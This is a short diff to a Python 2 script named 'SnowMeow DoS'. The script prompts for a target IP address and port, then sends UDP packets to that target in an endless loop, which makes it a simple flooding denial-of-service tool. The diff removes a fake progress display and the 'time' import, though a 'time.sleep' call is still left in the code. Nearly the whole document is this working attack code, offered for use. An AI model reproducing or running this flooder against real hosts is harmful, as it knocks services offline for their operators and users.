@@ -1,7 +1,5 @@
-
 import os
 import sys
-import time
 import random
 import socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -10,21 +8,7 @@ time.sleep(2)
 os.system("clear")
 print "SnowMeow DoS"
 ip = raw_input("~ IP:  ")
-port = input("~ Port  ")
-os.system("clear")
-print("initialized ")
-print "...20%"
-time.sleep(0.1)
-print "...30%"
-time.sleep(0.2)
-print "...50%"
-time.sleep(0.1)
-print "...80%"
-time.sleep(0.1)
-print "...100%"
-
-
-time.sleep(0.5)
+port = input("~ Port:  ")
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
